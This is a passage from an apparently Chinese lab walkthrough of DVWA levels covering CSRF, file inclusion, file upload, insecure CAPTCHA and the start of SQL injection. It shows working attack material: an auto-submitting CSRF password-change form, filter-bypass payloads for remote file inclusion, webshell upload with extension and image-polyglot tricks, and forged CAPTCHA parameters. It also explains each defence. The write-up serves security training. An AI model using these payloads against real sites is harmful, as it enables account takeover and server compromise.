src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20125954.png" alt="屏幕截图 2024-02-21 125954"></p><p>Location后面跟着的便是原来的链接</p><p>如图可以看到我们已经更改成功原密码已经失效</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20130130.png" alt="屏幕截图 2024-02-21 130130"></p><p>这便是跨网站请求了此网站受信任用户的身份进行了密码修改的操作</p><h3 id="2-Medium-2"><a href="#2-Medium-2" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>在此等级中增加了referer判断只有 HTTP_REFERER 和 SERVER_NAME 不是来自同一个域才能进入修改密码的语句中</p><p>即：请求中的referer必须是服务器名<strong>意思是你这个请求必须来自他自己的页面不能是其他人提供的</strong></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20131856.png" alt="屏幕截图 2024-02-21 131856"></p><p>图中我已经将原网站的referer改了提交后便显示请求不正确</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20134006.png" alt="屏幕截图 2024-02-21 134006"></p><p>在实战中如果我们想通过别人点击我们所发送的链接来更改的话我们的域名肯定和原网站服务器的域名不一样这就需要我们去进行更改</p><p>当然受害者肯定不会帮我们手动添加 referer 的，因为代码使用了 <code>stripos</code> 函数来检测 referer，所以这个时候我们得自己构造好一个 html 页面表单：Html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1:8888/vulnerabilities/csrf/&quot;</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;222&quot;</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;222&quot;</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">&quot;csrf&quot;</span>].<span class="hljs-title function_">submit</span>(); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>该表单通过Javascript</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">&quot;csrf&quot;</span>].<span class="hljs-title function_">submit</span>(); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实现自动触发提交 id 为 csrf 的表单</p><p>自动提交完成后密码便完成了修改我们的目的也就达成了</p><h3 id="3-High-2"><a href="#3-High-2" class="headerlink" title="3.High"></a>3.High</h3><p>在这一关，我们输入相关内容是发现地址带入了token，这个时候我们需要借助上一关的存储型xss来爆出token</p><p>我们首先进入存储型xss High级别</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20114342.png" alt="屏幕截图 2024-02-23 114342"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20114353.png" alt="屏幕截图 2024-02-23 114353"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20114410.png" alt="屏幕截图 2024-02-23 114410"></p><h3 id="4-Impossible-2"><a href="#4-Impossible-2" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223114601749.png" alt="image-20240223114601749"></p><p>此关代码利用PDO技术防御SQL注入 又要求用户输入原始密码来防止CSRF攻击者在不知道原始密码的情况下无论如何都无法进行CSRF攻击</p><h2 id="四、File-Inclusion"><a href="#四、File-Inclusion" class="headerlink" title="四、File Inclusion"></a>四、File Inclusion</h2><p><strong>什么是文件包含漏洞：</strong></p><p>简单的来说就是服务器通过php的特性（函数的特性）去包含任意文件时，由于对包含的这个文件来源过滤不严，从而可去包含一个恶意的文件，而我们构造的这个恶意的文件来达到的目的</p><p><strong>函数</strong>：allow_url_fopen，allow_url_include开启</p><p>在phpstudy中</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20143028.png" alt="屏幕截图 2024-02-21 143028"></p><p>allow_url_fopen &#x3D; On</p><p><strong>允许将URL（如http：&#x2F;&#x2F;或ftp：&#x2F;&#x2F;）作为文件处理</strong></p><p>allow_url_include &#x3D; On</p><p><strong>允许include&#x2F;require打开URL（如http：&#x2F;&#x2F;或ftp：&#x2F;&#x2F;）作为文件处理</strong></p><h3 id="1-Low-3"><a href="#1-Low-3" class="headerlink" title="1.Low"></a>1.Low</h3><p>我们可以先看源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20145245.png" alt="屏幕截图 2024-02-21 145245"></p><p>我们发现它没有做任何过滤通过get方式提交</p><p>然后就可以在地址栏的位置输入一个文件地址</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20145027.png" alt="屏幕截图 2024-02-21 145027"></p><p>如上图所示成功利用文件包含漏洞</p><p>然后我们就可以看到php配置的相关信息</p><h3 id="2-Medium-3"><a href="#2-Medium-3" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240221145725157.png" alt="image-20240221145725157"></p><p>此关对传入的参数进行了过滤过滤掉了</p><p><code>http://            https://                ../                ..\\</code></p><p>以上四个字符串</p><p><strong>本地文件包含：</strong></p><p>但是不影响我们使用本地的路径来包含文件</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20150329.png" alt="屏幕截图 2024-02-21 150329"><strong>远程文件包含</strong></p><p>再看远程文件包含，过滤了 <code>http://</code> 和 <code>https://</code>，因为使用的是 str_replace 替换为空，所以这里可以使用常规套路，就是嵌套双写绕过。具体的 payload 如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/fi/</span>?page=hhttps:<span class="hljs-regexp">//</span>ttps:<span class="hljs-regexp">//</span>www.sqlsec.com/info.txt<br></code></pre></td></tr></table></figure><p>str_replace 函数处理之后就变成了如下情况：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/fi/</span>?page=https:<span class="hljs-regexp">//</span>www.sqlsec.com/info.txt<br></code></pre></td></tr></table></figure><p>又因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/fi/<span class="hljs-string">?p</span>age=<span class="hljs-variable constant_">HTTPS</span><span class="hljs-symbol">://www</span>.sqlsec.com/info.txt<br></code></pre></td></tr></table></figure><h3 id="3-High-3"><a href="#3-High-3" class="headerlink" title="3.High"></a>3.High</h3><p>首先查看源代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20152556.png" alt="屏幕截图 2024-02-21 152556"></p><p>以上代码要求我们传入的参数必须要以file开头而且不能是include.php才能包含文件</p><p>这里刚好可以使用 file:&#x2F;&#x2F; 协议来进行文件读取</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20152342.png" alt="屏幕截图 2024-02-21 152342"></p><p><strong>注：</strong>“file:&#x2F;&#x2F;“是统一资源定位符（URL）中的协议部分，用于指示文件系</p><p>统路径。在这种URL中，”file:&#x2F;&#x2F;“后面紧跟着文件的绝对路径，例如”D:\phpstudy_pro\WWW\file phpinfo().php”。这种URL格式通常用于指向本地文件系统中的文件，而不是通过网络访问的文件</p><h3 id="4-Impossible-3"><a href="#4-Impossible-3" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>然后我们看一下安全的情况是如何构成的</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240221153230216.png" alt="image-20240221153230216"></p><p>这其实就是一个白名单</p><p>只允许包含指定的这几个php文件其他的就不行</p><h2 id="五、File-Upload"><a href="#五、File-Upload" class="headerlink" title="五、File Upload"></a>五、File Upload</h2><h3 id="1-Low-4"><a href="#1-Low-4" class="headerlink" title="1.Low"></a>1.Low</h3><p>随便上传一个文件，我们发现图片PNG格式是可以的，继续，PHP格式</p><p>发现也是可以的</p><p>那我们可以直接上传一句话木马</p><p>然后使用蚁剑连接便可以获取服务器的所有文件信息</p><h3 id="2-Medium-4"><a href="#2-Medium-4" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240221160611541.png" alt="image-20240221160611541"></p><p>我们发现这一关只允许上传JPEG和PNG文件</p><p>但是我们可以先将我们php文件的后缀更改为png后再在上传时通过bp改成php即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20163022.png" alt="屏幕截图 2024-02-21 163022"></p><p>上传成功</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20162956.png" alt="屏幕截图 2024-02-21 162956"></p><p>再访问到对应的文件看看是否正常</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20163250.png" alt="屏幕截图 2024-02-21 163250"></p><h3 id="3-High-4"><a href="#3-High-4" class="headerlink" title="3.High"></a>3.High</h3><p>这一关不仅对文件格式有限制它对文件大小也进行了限制</p><p>我们可以通过制作图片码的方式来传马</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20193150.png" alt="屏幕截图 2024-02-21 193150"></p><p>然后我们将2.png传入即可</p><p>然后我们进入到Low等级的文件包含中打开我们的文件即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20200114.png" alt="屏幕截图 2024-02-21 200114"></p><h3 id="4-Impossible-4"><a href="#4-Impossible-4" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 检查是否点击了名为&#x27;Upload&#x27;的按钮</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br><span class="hljs-comment">// 检查令牌，确保请求是合法的</span><br><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br><span class="hljs-comment">// 获取上传文件的信息，包括文件名、扩展名、大小、类型和临时路径</span><br><span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ]; <span class="hljs-comment">// 获取上传文件的名称</span><br><span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>); <span class="hljs-comment">// 获取文件扩展名</span><br><span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ]; <span class="hljs-comment">// 获取上传文件的大小</span><br><span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ]; <span class="hljs-comment">// 获取上传文件的类型</span><br><span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ]; <span class="hljs-comment">// 获取临时文件路径</span><br><br><span class="hljs-comment">// 定义上传文件的目标路径和文件名，并生成临时文件名</span><br><span class="hljs-variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;hackable/uploads/&#x27;</span>;<br><span class="hljs-variable">$target_file</span>   =  <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>; <span class="hljs-comment">// 生成唯一的目标文件名</span><br><span class="hljs-variable">$temp_file</span>     = ( ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="hljs-string">&#x27;&#x27;</span> ) ? ( <span class="hljs-title function_ invoke__">sys_get_temp_dir</span>() ) : ( <span class="hljs-title function_ invoke__">ini_get</span>( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) ) );<br><span class="hljs-variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>; <span class="hljs-comment">// 生成唯一的临时文件名</span><br><br><span class="hljs-comment">// 检查上传文件是否为图片，并满足特定条件（如文件类型、大小等）</span><br><span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpeg&#x27;</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span> ) &amp;&amp;<br><span class="hljs-title function_ invoke__">getimagesize</span>( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br><br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> ) &#123;<br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br><span class="hljs-title function_ invoke__">imagejpeg</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">100</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>( <span class="hljs-variable">$uploaded_tmp</span> );<br><span class="hljs-title function_ invoke__">imagepng</span>( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">9</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">imagedestroy</span>( <span class="hljs-variable">$img</span> );<br><br><span class="hljs-comment">// 将文件从临时文件夹移动到Web根目录</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">rename</span>( <span class="hljs-variable">$temp_file</span>, ( <span class="hljs-title function_ invoke__">getcwd</span>() . DIRECTORY_SEPARATOR . <span class="hljs-variable">$target_path</span> . <span class="hljs-variable">$target_file</span> ) ) ) &#123;<br><span class="hljs-comment">// 文件成功上传</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;a href=&#x27;<span class="hljs-subst">&#123;$target_path&#125;</span><span class="hljs-subst">&#123;$target_file&#125;</span>&#x27;&gt;<span class="hljs-subst">&#123;$target_file&#125;</span>&lt;/a&gt; 上传成功！&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 文件上传失败</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;您的图片未上传。&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// 删除任何临时文件</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$temp_file</span> ) )<br><span class="hljs-title function_ invoke__">unlink</span>( <span class="hljs-variable">$temp_file</span> );<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 无效的文件类型</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;您的图片未上传。我们只接受JPEG或PNG图片。&lt;/pre&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 生成令牌</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件名随机这里就无法使用截断、重写图片的话，使用图马就也无法绕过</p><p>而且也使用了Token</p><h2 id="六、Insecure-CAPTCHA"><a href="#六、Insecure-CAPTCHA" class="headerlink" title="六、Insecure CAPTCHA"></a>六、Insecure CAPTCHA</h2><h3 id="1-Low-5"><a href="#1-Low-5" class="headerlink" title="1.Low"></a>1.Low</h3><p>经过对源码的分析可知</p><p>更改密码分为两个部分step 1为验证码并不显示出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">recaptcha_check_answer</span>(<br><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span>],<br><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>);<br></code></pre></td></tr></table></figure><ul><li><code>recaptcha_check_answer</code> 函数是用于验证用户提交的 reCAPTCHA 响应是否正确的函数。</li><li>它接受两个参数：<ol><li><code>$_DVWA[&#39;recaptcha_private_key&#39;]</code>：这是您的 reCAPTCHA 私钥，用于验证用户提交的 reCAPTCHA 响应。</li><li><code>$_POST[&#39;g-recaptcha-response&#39;]</code>：这是用户在 reCAPTCHA 验证中生成的响应，用于验证用户是否通过了 reCAPTCHA 验证。</li></ol></li><li>函数返回一个响应对象 <code>$resp</code>，该对象包含了验证结果以及可能的错误信息。</li></ul><p>在这段代码中，<code>$resp</code> 变量将包含 reCAPTCHA 验证的结果，您可以根据这个结果来决定用户是否通过了 reCAPTCHA 验证，并相应地执行后续的操作，比如允许用户提交表单或者拒绝提交等。</p><p>需要注意的是，reCAPTCHA 是谷歌提供的一种验证码服务，用于防止恶意机器人提交表单或进行恶意操作。通过调用 <code>recaptcha_check_answer</code> 函数来进行人机验证</p><p>step 2为更改密码</p><p>我们可以直接跳转到step 2来跳过验证码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20204255.png" alt="屏幕截图 2024-02-21 204255"></p><p>改完后发包即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20204815.png" alt="屏幕截图 2024-02-21 204815"></p><h3 id="2-Medium-5"><a href="#2-Medium-5" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>此关与上一关的不同点是在step 2中检查用户是否通过了CAPTCHA验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( !<span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;passed_captcha&#x27;</span> ] ) &#123;<br><span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;<br><span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>只有返回值为ture时才能修改</p><p>所以我们使用bp抓包改包时要在上一关的基础上再加上passed_captcha&#x3D;ture</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20210116.png" alt="屏幕截图 2024-02-21 210116"></p><p>然后发送改好的包即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20210200.png" alt="屏幕截图 2024-02-21 210200"></p><h3 id="3-High-5"><a href="#3-High-5" class="headerlink" title="3.High"></a>3.High</h3><p>由源码可知这一关对于验证和密码更改没有分开</p><p>以下代码便是我们的突破点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<br><span class="hljs-variable">$resp</span> || <br>(<br><span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="hljs-string">&#x27;hidd3n_valu3&#x27;</span><br>&amp;&amp; <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="hljs-string">&#x27;reCAPTCHA&#x27;</span><span class="hljs-comment">//用于检查用户的浏览器代理字符串是否为 &#x27;reCAPTCHA&#x27;这个条件语句通常用于在服务器端验证请求是否来自reCAPTCHA服务</span><br>)<br>)<br></code></pre></td></tr></table></figure><p>我们可以进行伪造绕过$resp没有办法改变是服务器给的key但是我们可以伪造g-recaptcha-response&#x3D;hidd3n_valu3</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20212431.png" alt="屏幕截图 2024-02-21 212431"></p><p>改完发送即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20212457.png" alt="屏幕截图 2024-02-21 212457"></p><h3 id="4-Impossible-5"><a href="#4-Impossible-5" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>　Impossible级别的代码增加token机制防御CSRF攻击</p><p>利用PDO技术防护sql注入且验证过程不再分成两部分了</p><p>同时要求用户输入之前的密码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20212651.png" alt="屏幕截图 2024-02-21 212651"></p><h2 id="七、SQL-Injection"><a href="#七、SQL-Injection" class="headerlink" title="七、SQL Injection"></a>七、SQL Injection</h2><h3 id="1-Low-6"><a href="#1-Low-6" class="headerlink" title="1.Low"></a>1.Low</h3><p>首先查看注入点</p><p> 1’   – asd</p><p>然后猜字段</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20213231.png" alt="屏幕截图 2024-02-21 213231"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20213222.png" alt="屏幕截图 2024-02-21 213222"></p><p>由图可知存在两个字段</p><p>然后显示报错位</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20214110.png" alt="屏幕截图 2024-02-21 214110"></p><p>由图可知1 2均可显示出来</p><p>然后查找库名</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-21%20214308.png" alt="屏幕截图 2024-02-21 214308"></p><p>然后查找库里的表名</p><p>如图：</p><p><img 